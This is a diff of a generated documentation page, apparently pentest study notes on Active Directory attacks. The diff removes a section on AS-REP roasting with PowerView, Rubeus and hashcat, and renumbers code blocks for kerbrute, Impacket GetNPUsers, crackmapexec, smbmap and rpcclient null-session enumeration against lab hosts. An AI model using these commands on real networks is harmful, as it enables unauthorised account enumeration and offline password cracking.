@@ -16351,15 +16351,6 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#dont_req_preauth-value-using-get-domainuser" class="md-nav__link">
-    <span class="md-ellipsis">
-      DONT_REQ_PREAUTH Value using Get-DomainUser
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
   <a href="#dont_req_preauth-value-using-kerbrute" class="md-nav__link">
     <span class="md-ellipsis">
       DONT_REQ_PREAUTH Value using kerbrute
@@ -17471,15 +17462,6 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#dont_req_preauth-value-using-get-domainuser" class="md-nav__link">
-    <span class="md-ellipsis">
-      DONT_REQ_PREAUTH Value using Get-DomainUser
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
   <a href="#dont_req_preauth-value-using-kerbrute" class="md-nav__link">
     <span class="md-ellipsis">
       DONT_REQ_PREAUTH Value using kerbrute
@@ -17966,160 +17948,142 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <h3 id="asreproasting">💡 ASREPRoasting</h3>
 <p>It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled. </p>
 <p>ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module.</p>
-<h4 id="dont_req_preauth-value-using-get-domainuser">DONT_REQ_PREAUTH Value using Get-DomainUser</h4>
-<p>Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-23-1">1</a></span>
-<span class="normal"><a href="#__codelineno-23-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
-</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2"></a><span class="nb">Get-DomainUser</span> <span class="n">-PreauthNotRequired</span> <span class="p">|</span> <span class="nb">select </span><span class="n">samaccountname</span><span class="p">,</span><span class="n">userprincipalname</span><span class="p">,</span><span class="n">useraccountcontrol</span> <span class="p">|</span> <span class="nb">fl</span>
-</span></code></pre></div></td></tr></table></div>
-<p>With this information in hand, the Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth.</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-24-1">1</a></span>
-<span class="normal"><a href="#__codelineno-24-2">2</a></span>
-<span class="normal"><a href="#__codelineno-24-3">3</a></span>
-<span class="normal"><a href="#__codelineno-24-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1"></a><span class="c"># Retrieving AS-REP in Proper Format using Rubeus</span>
-</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asreproast</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="nv">$user</span> <span class="p">/</span><span class="n">nowrap</span> <span class="p">/</span><span class="n">format</span><span class="p">:</span><span class="n">hashcat</span>
-</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3"></a><span class="c"># Example:</span>
-</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4"></a><span class="c"># .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat</span>
-</span></code></pre></div></td></tr></table></div>
-<p>Cracking the Hash Offline with Hashcat:</p>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-25-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>ilfreight_asrep<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>
-</span></code></pre></div></td></tr></table></div>
 <h4 id="dont_req_preauth-value-using-kerbrute">DONT_REQ_PREAUTH Value using kerbrute</h4>
-<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-26-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1"></a><span class="go">kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt </span>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-23-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1"></a><span class="go">kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt </span>
 </span></code></pre></div></td></tr></table></div>
 <p>However, this will be as accurate as the user list.</p>
 <h4 id="get-npuserspy-from-the-impacket-toolkit">Get-NPUsers.py from the Impacket toolkit</h4>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-27-1">1</a></span>
-<span class="normal"><a href="#__codelineno-27-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1"></a><span class="c1"># Retuns all users that with DONT_REQ_PREAUTH amd UF_DONT_REQ_PREAUTH</span>
-</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2"></a>GetNPUsers.py<span class="w"> </span>INLANEFREIGHT.LOCAL/<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">172</span>.16.5.5<span class="w"> </span>-no-pass<span class="w"> </span>-usersfile<span class="w"> </span>jsmith.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span>SessionError
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-24-1">1</a></span>
+<span class="normal"><a href="#__codelineno-24-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1"></a><span class="c1"># Retuns all users that with DONT_REQ_PREAUTH amd UF_DONT_REQ_PREAUTH</span>
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2"></a>GetNPUsers.py<span class="w"> </span>INLANEFREIGHT.LOCAL/<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">172</span>.16.5.5<span class="w"> </span>-no-pass<span class="w"> </span>-usersfile<span class="w"> </span>jsmith.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span>SessionError
 </span></code></pre></div></td></tr></table></div>
 <h2 id="5-shares">5. Shares</h2>
 <h3 id="crackmapexec_2">crackmapexec</h3>
 <p><a href="../crackmapexec/">CrackMapExec</a>:</p>
-<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-28-1">1</a></span>
-<span class="normal"><a href="#__codelineno-28-2">2</a></span>
-<span class="normal"><a href="#__codelineno-28-3">3</a></span>
-<span class="normal"><a href="#__codelineno-28-4">4</a></span>
-<span class="normal"><a href="#__codelineno-28-5">5</a></span>
-<span class="normal"><a href="#__codelineno-28-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1"></a><span class="gp"># </span>Enumerate<span class="w"> </span>shares
-</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2"></a><span class="go">crackmapexec smb $ip -u &lt;username&gt; -p &lt;password&gt; --shares</span>
-</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3"></a>
-</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4"></a><span class="gp"># </span>The<span class="w"> </span>module<span class="w"> </span>spider_plus<span class="w"> </span>will<span class="w"> </span>dig<span class="w"> </span>through<span class="w"> </span>each<span class="w"> </span>readable<span class="w"> </span>share<span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>host<span class="w"> </span>and<span class="w"> </span>list<span class="w"> </span>all<span class="w"> </span>readable<span class="w"> </span>files.<span class="w"> </span>
-</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5"></a><span class="go">sudo crackmapexec smb  $ip --local-auth -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt; -M spider_plus --share &#39;NameOfShare&#39;</span>
-</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6"></a><span class="gp"># </span>CME<span class="w"> </span>writes<span class="w"> </span>the<span class="w"> </span>results<span class="w"> </span>to<span class="w"> </span>a<span class="w"> </span>JSON<span class="w"> </span>file<span class="w"> </span>located<span class="w"> </span>at<span class="w"> </span>/tmp/cme_spider_plus/&lt;ip<span class="w"> </span>of<span class="w"> </span>host&gt;
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-25-1">1</a></span>
+<span class="normal"><a href="#__codelineno-25-2">2</a></span>
+<span class="normal"><a href="#__codelineno-25-3">3</a></span>
+<span class="normal"><a href="#__codelineno-25-4">4</a></span>
+<span class="normal"><a href="#__codelineno-25-5">5</a></span>
+<span class="normal"><a href="#__codelineno-25-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1"></a><span class="gp"># </span>Enumerate<span class="w"> </span>shares
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2"></a><span class="go">crackmapexec smb $ip -u &lt;username&gt; -p &lt;password&gt; --shares</span>
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3"></a>
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4"></a><span class="gp"># </span>The<span class="w"> </span>module<span class="w"> </span>spider_plus<span class="w"> </span>will<span class="w"> </span>dig<span class="w"> </span>through<span class="w"> </span>each<span class="w"> </span>readable<span class="w"> </span>share<span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>host<span class="w"> </span>and<span class="w"> </span>list<span class="w"> </span>all<span class="w"> </span>readable<span class="w"> </span>files.<span class="w"> </span>
+</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5"></a><span class="go">sudo crackmapexec smb  $ip --local-auth -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt; -M spider_plus --share &#39;NameOfShare&#39;</span>
+</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6"></a><span class="gp"># </span>CME<span class="w"> </span>writes<span class="w"> </span>the<span class="w"> </span>results<span class="w"> </span>to<span class="w"> </span>a<span class="w"> </span>JSON<span class="w"> </span>file<span class="w"> </span>located<span class="w"> </span>at<span class="w"> </span>/tmp/cme_spider_plus/&lt;ip<span class="w"> </span>of<span class="w"> </span>host&gt;
 </span></code></pre></div></td></tr></table></div>
 <h3 id="smbmap">SMBMap</h3>
 <p><a href="../smbmap/">smbmap</a></p>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-29-1">1</a></span>
-<span class="normal"><a href="#__codelineno-29-2">2</a></span>
-<span class="normal"><a href="#__codelineno-29-3">3</a></span>
-<span class="normal"><a href="#__codelineno-29-4">4</a></span>
-<span class="normal"><a href="#__codelineno-29-5">5</a></span>
-<span class="normal"><a href="#__codelineno-29-6">6</a></span>
-<span class="normal"><a href="#__codelineno-29-7">7</a></span>
-<span class="normal"><a href="#__codelineno-29-8">8</a></span>
-<span class="normal"><a href="#__codelineno-29-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1"></a><span class="c1"># Enumerate network shares and access associated permissions.</span>
-</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2"></a>smbmap<span class="w"> </span>-H<span class="w"> </span><span class="nv">$ip</span>
-</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3"></a>
-</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4"></a><span class="c1"># # Enumerate network shares and access associated permissions with recursivity</span>
-</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5"></a>smbmap<span class="w"> </span>-H<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-r
-</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6"></a><span class="c1"># --dir-only: provides only the output of all directories and did not list all files.</span>
-</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7"></a>
-</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8"></a><span class="c1"># Check access and permissions level for a folder with recursion</span>
-</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9"></a>smbmap<span class="w"> </span>-u<span class="w"> </span><span class="nv">$username</span><span class="w"> </span>-p<span class="w"> </span><span class="nv">$password</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$domain</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-R<span class="w"> </span><span class="nv">$nameofFolder</span><span class="w"> </span>--dir-only
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-26-1">1</a></span>
+<span class="normal"><a href="#__codelineno-26-2">2</a></span>
+<span class="normal"><a href="#__codelineno-26-3">3</a></span>
+<span class="normal"><a href="#__codelineno-26-4">4</a></span>
+<span class="normal"><a href="#__codelineno-26-5">5</a></span>
+<span class="normal"><a href="#__codelineno-26-6">6</a></span>
+<span class="normal"><a href="#__codelineno-26-7">7</a></span>
+<span class="normal"><a href="#__codelineno-26-8">8</a></span>
+<span class="normal"><a href="#__codelineno-26-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1"></a><span class="c1"># Enumerate network shares and access associated permissions.</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2"></a>smbmap<span class="w"> </span>-H<span class="w"> </span><span class="nv">$ip</span>
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3"></a>
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4"></a><span class="c1"># # Enumerate network shares and access associated permissions with recursivity</span>
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5"></a>smbmap<span class="w"> </span>-H<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-r
+</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6"></a><span class="c1"># --dir-only: provides only the output of all directories and did not list all files.</span>
+</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7"></a>
+</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8"></a><span class="c1"># Check access and permissions level for a folder with recursion</span>
+</span><span id="__span-26-9"><a id="__codelineno-26-9" name="__codelineno-26-9"></a>smbmap<span class="w"> </span>-u<span class="w"> </span><span class="nv">$username</span><span class="w"> </span>-p<span class="w"> </span><span class="nv">$password</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$domain</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-R<span class="w"> </span><span class="nv">$nameofFolder</span><span class="w"> </span>--dir-only
 </span></code></pre></div></td></tr></table></div>
 <h3 id="rpcclient_2">rpcclient</h3>
 <p><a href="../rpcclient/">rpcclient</a></p>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-30-1">1</a></span>
-<span class="normal"><a href="#__codelineno-30-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1"></a><span class="c1"># SMB NULL Session with rpcclient</span>
-</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2"></a>rpcclient<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-N<span class="w"> </span><span class="nv">$ip</span>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-27-1">1</a></span>
+<span class="normal"><a href="#__codelineno-27-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1"></a><span class="c1"># SMB NULL Session with rpcclient</span>
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2"></a>rpcclient<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-N<span class="w"> </span><span class="nv">$ip</span>
 </span></code></pre></div></td></tr></table></div>
-<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-31-1"> 1</a></span>
-<span class="normal"><a href="#__codelineno-31-2"> 2</a></span>
-<span class="normal"><a href="#__codelineno-31-3"> 3</a></span>
-<span class="normal"><a href="#__codelineno-31-4"> 4</a></span>
-<span class="normal"><a href="#__codelineno-31-5"> 5</a></span>
-<span class="normal"><a href="#__codelineno-31-6"> 6</a></span>
-<span class="normal"><a href="#__codelineno-31-7"> 7</a></span>
-<span class="normal"><a href="#__codelineno-31-8"> 8</a></span>
-<span class="normal"><a href="#__codelineno-31-9"> 9</a></span>
-<span class="normal"><a href="#__codelineno-31-10">10</a></span>
-<span class="normal"><a href="#__codelineno-31-11">11</a></span>
-<span class="normal"><a href="#__codelineno-31-12">12</a></span>
-<span class="normal"><a href="#__codelineno-31-13">13</a></span>
-<span class="normal"><a href="#__codelineno-31-14">14</a></span>
-<span class="normal"><a href="#__codelineno-31-15">15</a></span>
-<span class="normal"><a href="#__codelineno-31-16">16</a></span>
-<span class="normal"><a href="#__codelineno-31-17">17</a></span>
-<span class="normal"><a href="#__codelineno-31-18">18</a></span>
-<span class="normal"><a href="#__codelineno-31-19">19</a></span>
-<span class="normal"><a href="#__codelineno-31-20">20</a></span>
-<span class="normal"><a href="#__codelineno-31-21">21</a></span>
-<span class="normal"><a href="#__codelineno-31-22">22</a></span>
-<span class="normal"><a href="#__codelineno-31-23">23</a></span>
-<span class="normal"><a href="#__codelineno-31-24">24</a></span>
-<span class="normal"><a href="#__codelineno-31-25">25</a></span>
-<span class="normal"><a href="#__codelineno-31-26">26</a></span>
-<span class="normal"><a href="#__codelineno-31-27">27</a></span>
-<span class="normal"><a href="#__codelineno-31-28">28</a></span>
-<span class="normal"><a href="#__codelineno-31-29">29</a></span>
-<span class="normal"><a href="#__codelineno-31-30">30</a></span>
-<span class="normal"><a href="#__codelineno-31-31">31</a></span>
-<span class="normal"><a href="#__codelineno-31-32">32</a></span>
-<span class="normal"><a href="#__codelineno-31-33">33</a></span>
-<span class="normal"><a href="#__codelineno-31-34">34</a></span>
-<span class="normal"><a href="#__codelineno-31-35">35</a></span>
-<span class="normal"><a href="#__codelineno-31-36">36</a></span>
-<span class="normal"><a href="#__codelineno-31-37">37</a></span>
-<span class="normal"><a href="#__codelineno-31-38">38</a></span>
-<span class="normal"><a href="#__codelineno-31-39">39</a></span>
-<span class="normal"><a href="#__codelineno-31-40">40</a></span>
-<span class="normal"><a href="#__codelineno-31-41">41</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1"></a><span class="gp"># </span>SMB<span class="w"> </span>NULL<span class="w"> </span>Session<span class="w"> </span>with<span class="w"> </span>rpcclient
-</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2"></a><span class="go">rpcclient -U &quot;&quot; -N $ip</span>
-</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3"></a>
-</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4"></a><span class="gp"># </span>Connect<span class="w"> </span>to<span class="w"> </span>a<span class="w"> </span>remote<span class="w"> </span>shared<span class="w"> </span>folder<span class="w"> </span><span class="o">(</span>same<span class="w"> </span>as<span class="w"> </span>smbclient<span class="w"> </span><span class="k">in</span><span class="w"> </span>this<span class="w"> </span>regard<span class="o">)</span>
-</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5"></a><span class="go">rpcclient -U &quot;&quot; 10.129.14.128</span>
-</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6"></a><span class="go">rpcclient -U&#39;%&#39; 10.10.110.17</span>
-</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7"></a>
-</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8"></a><span class="gp"># </span>Server<span class="w"> </span>information
-</span><span id="__span-31-9"><a id="__codelineno-31-9" name="__codelineno-31-9"></a><span class="go">srvinfo</span>
-</span><span id="__span-31-10"><a id="__codelineno-31-10" name="__codelineno-31-10"></a>
-</span><span id="__span-31-11"><a id="__codelineno-31-11" name="__codelineno-31-11"></a><span class="gp"># </span>Enumerate<span class="w"> </span>all<span class="w"> </span>domains<span class="w"> </span>that<span class="w"> </span>are<span class="w"> </span>deployed<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>network<span class="w"> </span>
-</span><span id="__span-31-12"><a id="__codelineno-31-12" name="__codelineno-31-12"></a><span class="go">enumdomains</span>
-</span><span id="__span-31-13"><a id="__codelineno-31-13" name="__codelineno-31-13"></a>
-</span><span id="__span-31-14"><a id="__codelineno-31-14" name="__codelineno-31-14"></a><span class="gp"># </span>Provides<span class="w"> </span>domain,<span class="w"> </span>server,<span class="w"> </span>and<span class="w"> </span>user<span class="w"> </span>information<span class="w"> </span>of<span class="w"> </span>deployed<span class="w"> </span>domains.
-</span><span id="__span-31-15"><a id="__codelineno-31-15" name="__codelineno-31-15"></a><span class="go">querydominfo</span>
-</span><span id="__span-31-16"><a id="__codelineno-31-16" name="__codelineno-31-16"></a>
-</span><span id="__span-31-17"><a id="__codelineno-31-17" name="__codelineno-31-17"></a><span class="gp"># </span>Enumerates<span class="w"> </span>all<span class="w"> </span>available<span class="w"> </span>shares.
-</span><span id="__span-31-18"><a id="__codelineno-31-18" name="__codelineno-31-18"></a><span class="go">netshareenumall</span>
-</span><span id="__span-31-19"><a id="__codelineno-31-19" name="__codelineno-31-19"></a>
-</span><span id="__span-31-20"><a id="__codelineno-31-20" name="__codelineno-31-20"></a><span class="gp"># </span>Provides<span class="w"> </span>information<span class="w"> </span>about<span class="w"> </span>a<span class="w"> </span>specific<span class="w"> </span>share.
-</span><span id="__span-31-21"><a id="__codelineno-31-21" name="__codelineno-31-21"></a><span class="go">netsharegetinfo &lt;share&gt;</span>
-</span><span id="__span-31-22"><a id="__codelineno-31-22" name="__codelineno-31-22"></a>
-</span><span id="__span-31-23"><a id="__codelineno-31-23" name="__codelineno-31-23"></a><span class="gp"># </span>Get<span class="w"> </span>Domain<span class="w"> </span>Password<span class="w"> </span>Information
-</span><span id="__span-31-24"><a id="__codelineno-31-24" name="__codelineno-31-24"></a><span class="go">getdompwinfo</span>
-</span><span id="__span-31-25"><a id="__codelineno-31-25" name="__codelineno-31-25"></a>
-</span><span id="__span-31-26"><a id="__codelineno-31-26" name="__codelineno-31-26"></a><span class="gp"># </span>Enumerates<span class="w"> </span>all<span class="w"> </span>domain<span class="w"> </span>users.
-</span><span id="__span-31-27"><a id="__codelineno-31-27" name="__codelineno-31-27"></a><span class="go">enumdomusers</span>
-</span><span id="__span-31-28"><a id="__codelineno-31-28" name="__codelineno-31-28"></a>
-</span><span id="__span-31-29"><a id="__codelineno-31-29" name="__codelineno-31-29"></a><span class="gp"># </span>Provides<span class="w"> </span>information<span class="w"> </span>about<span class="w"> </span>a<span class="w"> </span>specific<span class="w"> </span>user.
-</span><span id="__span-31-30"><a id="__codelineno-31-30" name="__codelineno-31-30"></a><span class="go">queryuser &lt;RID&gt;</span>
-</span><span id="__span-31-31"><a id="__codelineno-31-31" name="__codelineno-31-31"></a><span class="gp">    # </span>An<span class="w"> </span>example:
-</span><span id="__span-31-32"><a id="__codelineno-31-32" name="__codelineno-31-32"></a><span class="gp">    # </span>rpcclient<span class="w"> </span>$&gt;<span class="w"> </span>queryuser<span class="w"> </span>0x3e8
-</span><span id="__span-31-33"><a id="__codelineno-31-33" name="__codelineno-31-33"></a>
-</span><span id="__span-31-34"><a id="__codelineno-31-34" name="__codelineno-31-34"></a><span class="gp"># </span>Provides<span class="w"> </span>information<span class="w"> </span>about<span class="w"> </span>a<span class="w"> </span>specific<span class="w"> </span>group.
-</span><span id="__span-31-35"><a id="__codelineno-31-35" name="__codelineno-31-35"></a><span class="go">querygroup &lt;ID&gt;</span>
-</span><span id="__span-31-36"><a id="__codelineno-31-36" name="__codelineno-31-36"></a>
-</span><span id="__span-31-37"><a id="__codelineno-31-37" name="__codelineno-31-37"></a><span class="gp"># </span>Enumerating<span class="w"> </span>Privileges
-</span><span id="__span-31-38"><a id="__codelineno-31-38" name="__codelineno-31-38"></a><span class="go">enumprivs</span>
-</span><span id="__span-31-39"><a id="__codelineno-31-39" name="__codelineno-31-39"></a>
-</span><span id="__span-31-40"><a id="__codelineno-31-40" name="__codelineno-31-40"></a><span class="gp"># </span>Enumerating<span class="w"> </span>SID<span class="w"> </span>from<span class="w"> </span>LSA
-</span><span id="__span-31-41"><a id="__codelineno-31-41" name="__codelineno-31-41"></a><span class="go">lsaenumsid</span>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-28-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-28-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-28-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-28-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-28-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-28-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-28-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-28-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-28-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-28-10">10</a></span>
+<span class="normal"><a href="#__codelineno-28-11">11</a></span>
+<span class="normal"><a href="#__codelineno-28-12">12</a></span>
+<span class="normal"><a href="#__codelineno-28-13">13</a></span>
+<span class="normal"><a href="#__codelineno-28-14">14</a></span>
+<span class="normal"><a href="#__codelineno-28-15">15</a></span>
+<span class="normal"><a href="#__codelineno-28-16">16</a></span>
+<span class="normal"><a href="#__codelineno-28-17">17</a></span>
+<span class="normal"><a href="#__codelineno-28-18">18</a></span>
+<span class="normal"><a href="#__codelineno-28-19">19</a></span>
+<span class="normal"><a href="#__codelineno-28-20">20</a></span>
+<span class="normal"><a href="#__codelineno-28-21">21</a></span>
+<span class="normal"><a href="#__codelineno-28-22">22</a></span>
+<span class="normal"><a href="#__codelineno-28-23">23</a></span>
+<span class="normal"><a href="#__codelineno-28-24">24</a></span>
+<span class="normal"><a href="#__codelineno-28-25">25</a></span>
+<span class="normal"><a href="#__codelineno-28-26">26</a></span>
+<span class="normal"><a href="#__codelineno-28-27">27</a></span>
+<span class="normal"><a href="#__codelineno-28-28">28</a></span>
+<span class="normal"><a href="#__codelineno-28-29">29</a></span>
+<span class="normal"><a href="#__codelineno-28-30">30</a></span>
+<span class="normal"><a href="#__codelineno-28-31">31</a></span>
+<span class="normal"><a href="#__codelineno-28-32">32</a></span>
+<span class="normal"><a href="#__codelineno-28-33">33</a></span>
+<span class="normal"><a href="#__codelineno-28-34">34</a></span>
+<span class="normal"><a href="#__codelineno-28-35">35</a></span>
+<span class="normal"><a href="#__codelineno-28-36">36</a></span>
+<span class="normal"><a href="#__codelineno-28-37">37</a></span>
+<span class="normal"><a href="#__codelineno-28-38">38</a></span>
+<span class="normal"><a href="#__codelineno-28-39">39</a></span>
+<span class="normal"><a href="#__codelineno-28-40">40</a></span>
+<span class="normal"><a href="#__codelineno-28-41">41</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1"></a><span class="gp"># </span>SMB<span class="w"> </span>NULL<span class="w"> </span>Session<span class="w"> </span>with<span class="w"> </span>rpcclient
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2"></a><span class="go">rpcclient -U &quot;&quot; -N $ip</span>
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3"></a>
